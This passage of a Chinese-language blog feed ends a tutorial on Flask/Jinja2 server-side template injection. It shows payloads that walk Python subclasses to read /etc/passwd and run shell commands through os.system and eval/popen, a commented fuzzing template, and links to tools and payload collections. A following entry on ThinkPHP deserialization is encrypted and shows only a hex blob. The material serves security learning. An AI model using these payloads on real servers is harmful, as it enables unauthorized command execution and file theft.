%&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in &#39;&#39;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;system&#39;](&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>fuzz脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;  </span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;         &#x2F;&#x2F;遍历基类 找到eval函数</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;    &#x2F;&#x2F;找到了</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;) &#125;&#125;  &#x2F;&#x2F;导入cmd 执行popen里的命令 read读出数据</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><ul><li>jinja2判断</li></ul><p><code>49</code>:jinja2 返回的是 7777777 ，通过测试可以确定为 jinja2 </p><h3 id="0x-07-推荐工具"><a href="#0x-07-推荐工具" class="headerlink" title="0x 07 推荐工具"></a>0x 07 推荐工具</h3><p>一把梭： <a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a></p><p>payload 合集：[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection]" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection]</a>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server</a> Side Template Injection)</p><blockquote><p>参考资料</p><p><a href="https://glotozz.github.io/2020/02/24/flask模版注入/" target="_blank" rel="noopener">https://glotozz.github.io/2020/02/24/flask模版注入/</a></p><p><a href="https://lihuaiqiu.github.io/2019/07/07/SSTI模板注入-Jinja2/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/07/07/SSTI模板注入-Jinja2/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-基础知识&quot;&gt;&lt;a href=&quot;#0x-01-基础知识&quot; class=&quot;headerlink&quot; title=&quot;0x 01 基础知识&quot;&gt;&lt;/a&gt;0x 01 基础知识&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;参考这篇文章：&lt;a href=&quot;https://w
      
    
    </summary>
    
    
      <category term="web基础知识" scheme="http://yoursite.com/categories/web%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="flask模板注入" scheme="http://yoursite.com/tags/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 6.0.x反序列化分析(一)</title>
    <link href="http://yoursite.com/2020/04/05/ThinkPHP-6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90-%E4%B8%80/"/>
    <id>http://yoursite.com/2020/04/05/ThinkPHP-6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90-%E4%B8%80/</id>
    <published>2020-04-05T05:43:10.000Z</published>
    <updated>2020-04-05T12:26:19.581Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="dcdfba4d3eb398d9fae1cea0f79d026a1d1fa33b3d4593f2ddfa60849bde109e">8931505bb83619d6ad17af3c681588a7c67e1c4a023a0d72ff734c3959c72ea248aabc8d84131af25235293a824d05b7d0e14964d9cabfae998a434d401f6c4f479129149ce56860955b704e1fe2ee377967b21a65cd482d9a5f50051f1eb15275e5af0bb645e7846a1c87e5d90b45eb8dd981999e3a769dba65d58c6cd1596b725a74a0b4a573122d75a0004c3c84ef1acfe26e8648eeb99ea13cc5ae0f9943aed6173a0261bda1d5567bdabcc6a4d9a5c5c12d7d52aedaf19c16157610445c2c791bfcad71f464e70a5b37f73d1b7a59e7815a103600daa36a2f28da28f66c218ef6a66d30c47100b06ed023edd1a58090cbbcf1d374a14c8d352687f7121926f5a06c586a34352e59f41af476cabff5f9b56a2e8d08f1fa906a3447032cea1880f569ab869f50ad20f1913ef17ac388c28f25fa09be2f0f337b97d80945ad77eb85c15dd5b8e55707424163964d4ac57271ce4551b9b23258542231d1e43181837a7ceebecff69c0ebe593500fe721eaa6743dc038b2a1b4a91fb8810482b6e103ba2522d415652397a24004762a2ce0ff5c1d1582b609564050a8689caf003e7f412ce657c1bfa766b2c113981572bee984cd08bbfb1806d16656a5be0d656d1390279871ea099228ba9a21ddaf61924a3a2fbe108bd4c1d61f7a9a9295d081cc021d461ee68ab42f5b79b02168e73ae16232da895533e3dc03c0a65bf122581cd3311544c8075d4ef7b5d38208998062a1b04da7c6ea617c1fabb2ad8d0aceb0ecd606af19c27026fafdc7b93229252f5b01661813065113b2fad91c26db9e8e452104683c56e5bf0e0e23d86479b4c286aa942996200e876ca93bcbe551bec95a0e98de26b7d340955250c5c5c52f4cc383e709e85c471e5965792a45593d72c15e7df1f4b97401ff57b94b96cd897df240be0db291aa4368a27bd75c9f7ce6e324ceaf36c2bbe07f5666a1384f629fa473898ef3216502bbdff25f6cc8df14fcd44097126a115df0747e0339e2b78e0930c569dea5268aedfa94cc729da16cc9bb40199b3f20f6f51c620d1be1c29106d6cf302ca9ac7229cc9726b1286d80c069b6cf7b939531a1f4a9d5dc005c25ab5e18c9e5cafff4a0db53c234aeb25922787a87a8fa6e4ec0284512f83b0d4b14dd130d366dc909596fd5d34c9d172269baf9cfe05cdcc12cf1f1fd13352f5910a2d18f6711b415bf46c22e315746b1337d32271bda7348102e396ac7195b2a9fb15951718c062e6167a8b33e99dade56763cf007974a2e892061189a79ae195859e60fc3fde6e2b5a320ebac426da354913cdefb9ef98cd7335ef2ca2931117fad58793d66a1e4cc0a0bc14c3cea5f51dbd523308872b425da817ad4e3db2e0197d81388d02afb7d346d1b2f8baa03525b63d574bdd24f7120bd7f3528f49ec8fa3341f1c947aded583ef89f5baeef905fd8f14906d2a7deda06435e15465bae33468f305ba9f2d90a0abd90eb2797cbfd31a80d7c16bf0027180a2cabab66712bb286b88e2210ccf405e82944f006361f50697775b07ddfd1b9d0cb9abc30eaddd216407f17b20df962dd5496b24cecbd6bd38b509e0e90f7a9244a7c70248bfcad675d9fb00d853ec3f18c684460678cb9cb3fd31ea142af075a00b5d608900e17a6462c3fc9817489bce7ac973b4bca5770bd10711c73459062d2506b3d7138b9197821ae2ee81a42d2db344df188840f16b0cb3490eaeb5606bc7907038e4eef0934da52ae48b069d0527b616fc248149256922a2566f51a76ae72d7274a29478c9cbd3d31fd832ec284c58c7ca2caeb189fb9c1bca91ac8a18d3645fbbc3825579561a733559d84bcaf8fbb939a69b09a98988afe0df91c86577eefb6eb86e5a8f718c76e1c8380bd30990774dfb75246cfc28fce12cb8b1cdf628f6e3fd4a69b632935d89ce6764cae817c33a554d111c8263cea4fc5be9c50293d728274f18246ab7c844ae20c5b01b5e9d84a04013a2e81e4cfc3df7e80910117b1b1a9b1094e4ff7192935bd0fa4a0090506dcc1f13644ea0bc141c2da426c9d7cd56522b417f670f28ee01e71205e4f43c8c361696080917409313a205718a25d3cde66cc754eefb7f09722304b87745258fa76358822311d6afd132018cb1343e30355fa9ecc7da46d9f96cddbd1c50faaa3af47c438c5abdc9e27c27ef2202cd8ad32f97fad927208715579de8260d12d31185dbd695b5e5826f63fe7b4879aa83c963bfa10b1cc32d808d1797c7539d8d17b5b133181788543c441661382e0aa83624001d224e4f09d428362a26a37f8c122ab16b46443c4a05aaeb882c6b04a5cfb4818cec28f2edff0305a5fc639a355dd05d3833f5209c26cd726d6da1680e58b3bd1129d10aab1c5a33297364771bf9117388143a057196cff5fd9e15c0c097dc73dfff2852fcfd5086f796387e606791aa9124829bc89edd207ce3680ff1c7d43c156ac30ebe2d997e75aec6511fbfbe1671c0ba9b8040bd572d7fbf07fe4911cce32b02b4b8488eeedcf8d398aa0d3d17ac210e359add0e6dffda02358f0a83341ac2ee961f598de616604e03e4f5a4c181c1ca88cb0749fc8da1cab130a95322718905c558e8e49a177fb037c6f3658d690e76e12cbf31baac8a39006450f967495a981cbd2e5e335f10b2bd41f06d3d0b98d82cd740d3d41edd6ea3edae835fef0a5255805993c63bd1f5531f8d5ffe1c5d0883e25ecbdc671ccc5df070d5c64357a120a3bce7180744d045e8036470f6b5a5ff1745a08018716e5456b27abe540a62a1a21e2b5bdcfb06a20778b1211ada5f88d139e520dba386051f4d7a1051119bb281bc7a8668ec4a1df139f8097c51943a07813fa8f0ebd7edaa8e7a10c63f029a0037630f4e40b6c7b1e6818f5cdba2d4747909aa8c57a69a907c2b0e9cad58bbe4c31937525425ea54efa25aa6bd5e289ac7007e8132a5fa901158e2dd5d39877961be6fb50604fe306d07769c9c5b384df8b3774eec274b88127b003047b6e4b63fc19594281450343503bbb2d551a56cc1785e42c345ba3fbe550161b3a9a7adb168d8a4cc8146174e782a75ce86583ae14ce7ed5742e19030c181612d3be617da151ffbd67e82d8be94ac6da124943d552784ad49d6f8613ecb60b9eec631825ce20ed303ddebf5f72d1618bd6449f34716ee3f7205ecdb6594209d992a20f84d0c0cdc337df3808cf2f219de96eaa44714e3c286e30ff7f264ad6f7bf39061cdbb5bc0d3573999c43f2a841facbcaad900b9c333b1e8baa19eab7ec916483955ff0c0ac2cc8b735a0db93fc9fc694ac45c847d9e8ad01237125fe87cf0a1c6e9620281bc428236b38585b0fc06d4208bdd4cba24fba80c6c23a28f2354a140fa8fcf699530a5d54c89f20c7219c2752fd9818094326a894af2cdbee85719b76663356ea713306d883f2f103b1faf6819fe0313143c76a3fd10fd97262f417f1e4b40db8392fd705c7ff8da8d0ca1b1b0c95da170f67dedb405290d98f10420888bd1047d7caf7f58849051f75209d3a9482d6beb50d65ffd1e72cc275ebeee9e9946258cdb6671e18a2dc5ec4c579a74cc4c001b9605f89a9bf9c27aafcbbc9077de6d1729e72f4083d65fe039bebe927b2aa7348f35e0fb1d208088ded67d42795f53d45cf7d3b626c5f11c971d39f6aa42ce2288900ed664c2b938e305a561ef513111970091426b5b8ff6a6e6bac8ae86df65d4f97ef3dffa58d27ec6a065cf51c9c8d4dabe9fddd5a8b3a8d50d452bf303b23144e2725ccf4b0b95d4f5932635df97c67dd7d83a4b634d4939a0fab03246fa8e54717d17b1f605a8259594b634134b64ea81bc47ee32b7dcba7a4a8b0bf216ac32dac6aa1a1258f9bbcd5ee3d0a7a747ea0d6ab84f1a3d4be7ee245c063926c6732263048ef0a5cc50de1703ceae62ffa74d4065927d1000059c1aafa6fbc9516b3c24ca37f46b2b9215ce222a1483c6deb1222d3a2b3b3bfed5011b98efb05b64dfa4ff15c8c090cef7144b8149876da05edf59ca22cbca6dcd3153efdf9c4cfdbba1495f428037d8f1636f443cac8eaa5dcc073c635ed3e52bf92e4cb39d1290883b364e9bb6d43b7c6c773e7bf2d2f6687fa6a9f19c6d073c1067f4ee006ed0ba0504a4ac5aa7e838bc17f0862ccf27c97c7f9fdee0b05c43a9d4338f36b553faea25fdef367e03f1d9c0c5b89e98a59199d51f0c01d613616e98b5c6ae33d718e00898c6b73791949b40b2b88d33342c2681962b18d8357569fa69e7004a14e6baddcabc41ba7765435b1ab167b813922c517afbe6f3e7d251501bd6de65a0d15eeaf2b3cdb4da467e0651ec34054cf87f292e895e0d16244a42452e12ce022df4121ca67e0d9dbe69b67714f5e04627f63a3ae4484ad5d91a09b867eca1849e773e124d07784f484ef660a765056ba9595a99e55b7183ba5ff3bc5d40d384b09a7754d400cc6258cd8541ea9cd4c67801f682cec4b874e2047b84789c758265e5138d7643739f9cf40e1ddbfdf4967f6fdef0fd5268822664334f306075ba24666e4a217d3c7c9d78138f1a880afda4d373ce10d953827d5eb5186cb48b123287b251be8f7d9502ebd8469ab16ddebb065eb1e6015c5d25a5c849f5562aa3f4b4257c609f763d62d6dbd807a628713a266da8a2f0e06cb9afc1ea2bc89ba220b4d375c0cf7974f8b710ec73ac811ab3dab1d0f91e22ae2d1bb275ec9b969532be63b9675fab606473590f6a067820ec31aae6e03f2643654443694bcafaeffc8ad9311dd70c9bc0b61ce9ebc0c380f62c0c548f59189e2d87e70f79918a37b090dd2d833bfe837a0323c3bee2bc2ea4ca3332b7641210519cb0aa736ce145c00ce3507361beb3a77e82261871bc43a3ab4c26cd4dc284c232080d463c4e84785cf05914a1c90029a02cb054fdc42f6e711e65f80d5a4bae403196a0575040857fb50ff2fc385d42f5becc6183d96b0e403877369a4bdd65a66457ac08559e26e82ca429ab1a848d2f362677708fb6a16f27489bacc8529667ddff4ee3f8ddde63052a78dd3a6d0355b0d7a3211b309df22a3c1eb7160e40d9036c07f9a4e9cc9b60008d040ea5680adaaab803c756cba7ff8e86db53c77eedb4dd4ffa0a1bcb9d0193b4df44e423c7268620e9cd0807713141a006d6eb9d37043a498fd7516ea34b905bac345905e9c4e0f2e173b4aea687e0230173d025b8f3113c347b665ddd0319b0c9045a2c4fcc3ecd86f42cb628f0bb3884e765392e982a3499f6c064804466c688982b94683ba1ee319408608b035d7bfde275365d21800738718380ab5f2755af686f246c729290a6fba1e36beded3caf84faadc81fb17668f747d181e26517675948cb9a41346c31436e32e471f81bd3184c34f903276c3a8c8583fcd0b542cea9fe466f12c57dee1d11f0a938ed66aa254b67967c7fefa511eec821657cfb28a95d36166a79321aa171620d9e3fae50283549107bf6ff1fac6f99c138c500d45dec6eca98cd080086ab6fa913481881004580b5d03f5058dd680d756d3e2c4b988bbf403ea1991a8467ec478c5fd5c3583a73480c7a41106e3d6d33b347c557723d41693b27c5cf76ed7add04270907c8248b78603355274b287cdac7a2b61f6830e998ff53efc2a3c97104e0c25ed2af8824694a0c8034992237f405b76753cf50298cd2a4a24031d8f6ca3047afff7184e0fb9afb7b6275ae191c636e0ab0b1a8dcdd776b5a8904d83146493593aea8686562a74b044137f3ebbc8ad9922d12cc647c29bd3dba14a005e5f04f70ad9030a56080840597010da53647ef0a546858ee2c0a5039f66bce4f3ac8728731d7f7e5f333db66b315f8179b9ad6e004c57a6fde007bf3c96edaead18e72adf826709170a22fc298384a6a9b3cd16b8c26a586f000180afabc13754b41f558e23192c144e46b6c59873f83c22f5a499d341960ddf56ce68b851dff4c138afb737c7811829eeb7ed44814647c81573f868bd9dbc38e1a5036f45cad6ff0707531470bf89e25cc2723f7559389067bf642920202b491f105027482c68a79501b907058171a97d5907ba7eeedbf45c3d3b898e7608987509fc21382fab36cf9a310b94d7937ade1b818a3b3dfcad5c8bcd024b43fad994098439be157cebae269120a12bd929334cd228c840beef2cdc7536737f89174d3420de57036071bc92fd51c9897100c04bde4594c79bf0b16d54745ed2d0ef3cb8d0094ef471ed945e801a51b4c6b686ca5e9651accf6691f9b68fc3806352b4483c9bc56f186041533b07932ccceea5f48095365b524be1711c90628f633cc919c0a0468ff4bfd0dbce987d338f8f155aaacc25d416e515004282247097b0e35ea8c9e0d91bd46e69f49a5bff5c3a62c53b218966a3e9a597ef5b6aaba0bb4154b42496450783e343b4eb2c04f0337bac3d14825983cceb9a8abf04ab7babb32fd6c9de4b244e3160ce194cb21a92636399ab244a1ee2824f7b04449c4465d77c29ddae4d0d5ad68d47ae8bd0f8f132f2ce32c96b498a803d2db56af744fda3eee7173ccd2c8260957dcc325051a5ab5f2f916548d1d756d36cb18db01ae687f51889f800fb4f23da4d43493aced5df989acb6c15fddfa148598417dfd1ba88ce287a20122a3d39c74b08c85d984e8de8ce713b4c076c2ccf426cbe927af410de7dd3b6757e6bd15cd708f2114284644c0d8602e1cf92c464525721e51639e9d8755568aa98ebce2e1426456a7cc7993194c6ad00c875a814476336c3637d97d89e5dd8df693fd663dfc796b5a8ba9961f18f5c1e5bd9c404297cbd0cdcbf318f9784a4115defff3382eb9993bf8934a7ff7d55687ef568e4273c353b5cf692fc6cfcf7f61be14ad35de78a7b9ec8883c9584afcae6126769e1743511028dcc971e693bdf05f00b3d5c74cbf974ac34157e5239c6dc33da06316663ba9bf5d53c5f2a86948beb2a0c5af786b39addb8db1fc6a24c8a5902a2c0f29fb50951a1db9713d15d39c0df0f2d8e798602e42e24c5a87ad9a4c895e691f7e8c223d9f3743b6729f6ce9a70639a29adea99609b74beb410cd7e93265104b4c895ffdb45decd7a7ea27ae5f848254ad8d041155487e3dc616d74f03e3cae86f98684683236964df819818aa63e85abf80cca7c4c02297dfd87fc47db68238257653e31df2a019af1e46ea91c6314c50d9090a88e723692a855f8b73dcdd2170e80d7e7695c0ede1955238e803a8bd38549f3c64bce65f85bf8072ddd5235f51502e3519b1133c0b2adf3504a65486c47b6b49c766af9648b05180493e42e6d44b2a971c2474e323125b6e0a24f758e4bd36a0b6a566e19ba5240652d08ecda4ba1c0e5361317ec8d44b49dc483358e5b1c85c56a6186a1c0f581dbdca34ba4758d0881e067f8472a55a9f155fa3ff50b94d46a0633601877e0afcc8331f88756b21f43b5edf4577827a3b4ac186e89842cb11bd8b7af7fb651acfb3dfd6652dd0ef8ca3e8da3271c642e1b9bba0d9c2732586292d3837d41ce5f0ad483d1f16ade03ece913474fd0d206d8d7ec9d2e2ccaf8a270a683fe2bbe5e414c2def3a0da8c7d5be259b334649525695de30d9083e815ad5d64091a184fef0b5b666d1cd80b3427871012b401d176a335e71ba83d9037e72780c76fc1a5f975c4d93a5f84a52eba9dc56b3b30eb0a8d5445a8d8c71303ce4aac0d4d486d9fa51d997393d3e6f112a2fdfbc6031977d752b6c614f67f0245a85a77dad6dbb6e3f563a2f0f9783bbfe9ba2e86125027e6b9c9ac6f1b1360ff9167b912cf74b0c62cbd4ae46176800b2733acb25e249fa5a2300b91e77a0b69dff3fbdcc29bec3cdceb1ad1b43747a9d2dbe898471f16bebdd614e6fad5692447473365a7bf1bcad20a73b19fa0fbb188e4e73854792f00f7a51aabf8f960ee4f249189aeaefd48141b7070421954dbed01f3ce326afec04e41f66b017ab3bfd5b4a25ecd0a17f1d9916de2ef91fd7d1c48a8ba2f8a0e1f4b9b5060167788a18f2a49863ae3ee04533ec296a6ec1df3208e6473be21f893d86f946b07fb8916219c7ed91e8a6513e2851f2612ccbc601c77a2ce9da3cdfd59f76de49503cbcad5a11907096561e12f63bd60ca9ce2ac038930381414592c2bdff0763380d3ffb13167e4d6cc8e0b1ff39c528a863b7fc383232b13baba197cd1515d480c6fd70a5bd417542e401bd7f894135b4aa2a2e44f6b265788feeaeeb9b5fcd6abcd67ce70d82b5f7b01d152abe545c82b4ab6b6f040c074aa14a69c12fbb7dfcf72cd4fbd76be0e7f97c93b29293dedcbe2cb31b49f5ea7c9265e6b7c826a99272ce081ee62bb1899f1d24b507348ba26f3f4dd025429c0b8bce794b785e99a5c14df38ad4917216209368f200851f45f9ce7c391f0dbfce20e92f989bec3be288581d9520da390a5af8f8e7e0ed0ddc2681942ef72f313bb68f6c46a9373ddc8ea97a35c0dd4ad2da296ef9aedb360a9be74b6d28d1c047c95804e40bfec1f4c214d207596381d9ecd80b785191297f5c9a20fcd18c86b75900b0bba1e93c803c2da99f21741be5ebe8a27bbf9f1c00cdacfb54e5de1b6783e2fe20fe3960257dcc5c6a7c7c0582f2e8e025b681b34b9112c86e3bb2c85ac1e69790fb2df5af43e16ab0900dda7b6496edca1a6ed21e696d8de56ebb71addbf3a92020308c9b941177c28a02a0c205726011c3dcc7d8121a03823de9a3d08438e65ab1cb6654d5543c23b7a23a9fbf17dc3b2dda62f1d92219b55fb94be69f1a318c6826638f3d223eaca2f9f1366e9128088e2ad4873482cccb54556e833692b756a7b3315d13457e9eade9fb48162a1d4260abd45761c25dd7537ee8c29a99ed58b30e87b8aa0b409c48716f3eb39ffc130d3ad38fda5ff764c855749efe61ae980dff1bca3d4a6bb974b8447efb71e1d25af0dec5810e0aed95d687416e1b9bb1925b02b68fb04413c416d16f510e5b0876b4a869d9fce1f49a9f360fab9df14a6648ede1abb389b1695154766445194f898af8863cdecbc854b6b8ce73d870b549cec63c015e258092f2a9eba72fe5082aca8b20c7c2c8aaa0c2b4b4ddeda4e0ff74e2c629da62cd044be8320955c3ec27d6352e3dca27d979dd89637fabc6f948946d7b93b38549f9b2f95a369f3e0f136c379939e80965a20193af72dcf283cf379e268d6c61caf86f2c6047ded673f341726344736fb4e24f3f3783b2455301cceed57d523b103fbad9e1abc2346dfe3a236da99c81331c936def2e2cc760466578ed8f39c8aba9b9fa4db0021fa13bc16f87795734d8a610227c323f0e93beeb5b9d94b676e713b9483305791b87a3b00eb55755f0f5d079ef764afc366833e2fc3976db299bef79c9a2f862d45f623ff984d6ee5619dbe5aa736c444907c015137400185050b762e0aaa3b3d4cb9588e9a758ec5689db158836b649df413b3825a05cdc099f41ee000882e595840c594e1d04bfc10b56f95bcaca25d025bd33b0fe819da987b8cce24dc86d3de1673cafc34500e87cba9ffba99fc238d64bc3887bb891e4cb2f8c36be5a3b733978ee75bfd8b65ec435a12da36f9b1b66932dc4013e3993eb5751f2a72dbee006bac0bb1f700a8a5dac9f2e53203a07abed1e0580d1a9a01ca8e7987eb47c3f2cd7d7842790041553278d85d9eb9a97ba04cdff88d9d3c8c0b0ee29f31ec4cdf428c926b8ed269d15e3af7b6767c7c87528352f064208bf6e7a78977f64467a01ea605c662c5a5c661c4f7d5acdcd9b26f11fc72ed172014a9b85d2405e2905b404148bbbfeb610f46a4030fd4782d7f72574621244a61c2991b11e162bc3e9e6bc67da693cec0b649e68e2db72c93edc9a68bd143e1c59e563d5bb6d7d58c51134c7a4a9ec14447d82f9be3617aeb6e5d87f9d21acfb230e129e4f9e8c76b6bd17f93203458b850366ea655402afd243e9be2b84b11d83b79033935051d53b6e5047be40cafd4dcd384a6e7123ee547819436f298b86b3322fcb1233d758af6b6501560fd32e28568e02c0f1acef6642ac7b82005c7e1237bc54c8506da01f3c3b20741f893b6a5a31d9ae0bf5970dd4babbb29dec5e077d6edd0385b167326017a221b676c62d04e9c1f13ad973a17bfce36e805ba65d986c16f72bcfcb9664d0b3e71e3ef18c78023c130cfaf87867fb8c23751efb1a09dc81dc08e32b45c601e667b5a910542b280a0d34c426bbb30d880641a2f4ce4f1b1d3299229e85095753ebefd2ac3f0afe8db08bb479f413a63870fe44f3cd5ef8e77625dbaed77cd952578eb19cc17f68ab556e7f4f71540a3f1a57467d4333d1460bc9c4bd8554032d2b76e575b61ce9b1c1e9b306f1b10d41448642b86ed367c59450580b4ce53c16c4a855908196a581cdfafd014aa713d39cd83f9b2432ed231e3dc4853a602c8cc85aa9dd85c02bdf30e3c179953bbe966baeeab41eb4efef28cd2c8eeb5c639864344d24c44076aba3f3a534e27ce9c1bcc45cd7737839ea8f3968886c929cb2c558740fff00472cf18f1457db69dff2b52dcd1db7ba10ad261cdac28d6d37229d44b5371028a5dbccff83ce9600efbf10f3d442013add05f6c789e974361b3fd5c69c6db327e1650a38cef6047049637d8fd2fc215b38b5eb70aff45b2cf0f4bcd29e02438f94cb5b359cda5b642b5079a6b8a7a37484029885851c3ef2d23212599abc179ef045d8603cb3e2ac1af9d839e9472d616e5a8dc53527d0a6326b6ef15ecdbf3b928dbb23dd7be4b0b3673322064746833590ae507f794688b51292eb6af7a473becab6b4bc68e4cb3ae4e000cee218c62153562d5352f8ca0785f642a28f54324651c27c892d9e960e91a7e31d239a14e678c6e4466e43c533e4c2fe06a40e8d103314028cf59a156e1da87f1a22f7128d4c02af7213efa9de035f940ed2abe8f8779f7a5c7fed04172a5bdc7085ee0869d81bafa3b7d85c2ce613b38371b6c4b48b148379a7745cb496e6b6f481e3569dadc6c9d91ea53342801ede2c492a67b39151d233d195df8514df8a74223513d44e7dd67d90d5c041a0b7a9a5b44a53164a2d71fca188943f008d90cccd5ed255d32565fea7e6255b3284a147491198b9cab0415ce87a1c38ff9a14f0a39ae77ea8e5ef448a370cfaf4aa73e7d665816443863ca61caf30e6d2338a3e9a451de961be0e45ebe6a64f3a02a7d99c21e404f15fdb58b3a7167f1667ff9f1ce5acb8bae9d53b5f3977f3fe8b9a2f9ee62b43b0cd47771edf18c9215be10e2de9789267be8b5a55fbaba250ec9c63857d714e52a951459e265ce317b3b7881df191899c68c101dc56f0bcbe2629fa86ea9934838c0a1dd2dfc92023e596b90d211bff705318916d4f44e882e4cdae644271bbe69d73cc380a1b5d6b9f821e947a802b74d51df691d703f00c2dc789178b47fcb93cd99b9ce4a37512463b893586fdd1fc0409725d0e91865446e10890cf26f1369e39c1c938b8f30d1f05e364cc0a1631a8358c71511ca2bf776c70d991ef8d7404bd5333f17d0accc48ad508dd962f82471f3f6221bee11661855c70c9a94ab6800c5a9bb8763b4f8fb1fc39b9f781154e898b60e1037d42a3d052603016b278edf5c9b50068613922a55f467756bc7ea5ee5708469716c55607514adca36fcb799160ed5f61d0a815e5c6a2b557f2d9fcc06885fed93a2e3b9ea13c429c1ff08c830ede960bf8259812aa766808b85dd39bd1cb5f812d07cc16e56f197a75f287a93379f10e56a99ee2d264912b7edee1f0d60a03665a8c37fb37e125d7330714b246c4c578d223355d9ab8de1079eb1dd302dade29eba454d1afdbd9aaaebc23dd2f0174dbef29026309e094b814a1353f2af6ae082c3a20139ff0b8f6814ed9f7755e99ebac1c1495891bf671ba7ba8fb7e793ebc0d3416f3feacd0f16d3a305326c4b81836e64b25311029ae59eaa4161b856f00e86e6950df94b905759c9e2b0e84ebe6ab6061dec6f346607820f477075e229cd5f8524c9f8fbb5fe32f14fedc3c72a46ca5d9d3cb0c2357d2d5f5ac8f3b6f5d8ae95db853281264920c1c7140228cb22e86088454996cde3576a0350da098a3769f34d2c8aacb6b513975f418bebe8842a7cf3f0a72e5eafe0bb1833538815bebeb5438f286a10320fd04a89a367d255e3b799ff3ad879c38631b1581e4f766ac612e096e5b2d5e8b6df82348224ea7a7b6992cd6e6535bf9f68e875c5450ed725002ab6b179225aecad35a1a333ede499295faccce1edaf764e365a4bf5685119293b6a7ec18cd8a0ab757ab1860d2e6b1da2b542991b64c7587dbfd9cf31c4bb2a50216e251978ad259ed4b3e0fd793dc3f5411312b2e0e493ebabb577fb035afbd3a0c6b9353d1a8634cd2acfd8ff732a41422ef3aa5c6e18ab5191291778e378510340965b3b3eac5cd95880677eddce72a8fa2f91b5c061f71373265bd78ba225244ce5772d68693983a383b7351e18d47cf4d2f0c975c5d4d92c06c55aed2da3bfaa2d85a89f40269691f6edc39c872c0e304d90b458cf20aaa1ca4358ce78d07f0d2b94c5619b4c5f4ac4d546e68b23cb9cb1203644310db1d3729c0e4e9095aa4395f0fc267f0152b304ec0fec14471e0eaa44e4bf4642503b7bb0a85e8b5d9f839a877c259ce5bd203b96cadcc882e3669a9f8465c04a7fc7d7acb81dc19884a584dcbb28be70230d7f47a93c11c5f8312b2e6a0179cc0b4516cdbac77305a8fd58d72dcf2a64502469a46528fbf5fcaab14e344c67a372ea7369c65e4098341166e352f60a2c851847aab3cd98e91c1e1591391b360ef0bbf90cac31f1d910c7c8da0782f75f7d58c50dc038deecca3a73b13860459b81eeba91de4315eddd10274ffacc7ea75e30976d1603164a4ebf8c88230e8d4056629c5690e1f0ef37078bdee58ed507dbb2cdf08b41960ed6049c02d2f7d258a6dc364cda9d8602de6ff584564dfadb8ac46355dfd063a42c72a1b05bb8edf30116562526abcf05fa73b081194b6f976a497183c4d16c4420e5800452be06e421f77e41b3f6c34084971662dc044f536ec6d83fddbda55288c2dd661fc8a131eb4dfc96c698f2f0fe3548df6e62669efb0041b5e8bf679e3a9b90214cee7002097fa1f200e7cdc4ea55e1cbe7a026ac64e867f0b126f203236e2b61c713ad94209edd7ac541334c27477a598e81aa9c96ea95c42f0f765261beca8d982749eb4e1d1fac420d6d49f9bcd3d813f4c0dcd8d2bc507617eeb16cde76eb6ae6978cbb378622f89f9fab6f89b1667ba16d7f31d494e5ed948fecdaaf1ca8e2591616f309908b847d53cbac09a06db3cd757bc04dbf3676db86f60ac75ecdecb